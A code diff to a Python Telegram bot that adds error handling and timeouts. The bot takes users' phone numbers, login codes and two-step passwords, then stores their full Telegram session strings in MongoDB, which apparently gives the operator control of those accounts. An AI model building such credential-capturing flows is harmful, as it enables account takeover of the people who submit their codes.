@@ -104,16 +104,22 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
   )
 
   if update.message:
-    await update.message.reply_photo(
-        photo=START_IMAGE_URL, caption=welcome_text, reply_markup=reply_markup
-    )
+    try:
+      await update.message.reply_photo(
+          photo=START_IMAGE_URL, caption=welcome_text, reply_markup=reply_markup
+      )
+    except Exception:
+      await update.message.reply_text(text=welcome_text, reply_markup=reply_markup)
   elif update.callback_query:
     query = update.callback_query
     await query.answer()
     try:
       await query.message.edit_caption(caption=welcome_text, reply_markup=reply_markup)
     except Exception:
-      await query.edit_message_text(text=welcome_text, reply_markup=reply_markup)
+      try:
+        await query.edit_message_text(text=welcome_text, reply_markup=reply_markup)
+      except Exception:
+        pass
 
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -126,10 +132,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
       await query.message.edit_caption(caption=prompt_text)
     except Exception:
-      await query.edit_message_text(text=prompt_text)
+      try:
+        await query.edit_message_text(text=prompt_text)
+      except Exception:
+        pass
 
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+  if not update.message or not update.message.text:
+    return
+
   user_id = update.message.from_user.id
   text = update.message.text.strip()
 
@@ -171,7 +183,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
       await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
       string_session = client.session.save()
 
-      # Save session securely into MongoDB
       await users_collection.update_one(
           {"user_id": user_id},
           {"$set": {"session": string_session, "phone": phone}},
@@ -207,7 +218,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
       await client.sign_in(password=password)
       string_session = client.session.save()
 
-      # Save 2-step session securely into MongoDB
       await users_collection.update_one(
           {"user_id": user_id},
           {
@@ -229,26 +239,34 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     except Exception as e:
       await update.message.reply_text(
-          text=f"{to_small_files if 'To_small_files' in globals() else to_small_font}(f'❌ wrong password: {str(e)}')\n"
+          text=f"{to_small_font(f'❌ wrong password: {str(e)}')}\n"
           f"{to_small_font('please restart using /start')}"
       )
       user_temp_data.pop(user_id, None)
 
 
 def main():
-  app = ApplicationBuilder().token(BOT_TOKEN).build()
+  # Added connection timeouts to prevent TimedOut crash errors on Heroku
+  app = (
+      ApplicationBuilder()
+      .token(BOT_TOKEN)
+      .connect_timeout(30.0)
+      .read_timeout(30.0)
+      .write_timeout(30.0)
+      .build()
+  )
+
   app.add_handler(CommandHandler("start", start))
   app.add_handler(CallbackQueryHandler(button_handler))
   app.add_handler(
       MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message)
   )
 
-  logger.info("bot started successfully with mongodb support...")
-  print("bot started successfully...")
+  logger.info("bot started successfully with mongodb and timeout fix...")
+  print("bot started successfully with mongodb and timeout fix...")
 
   app.run_polling()
 
 
 if __name__ == "__main__":
   main()
-    
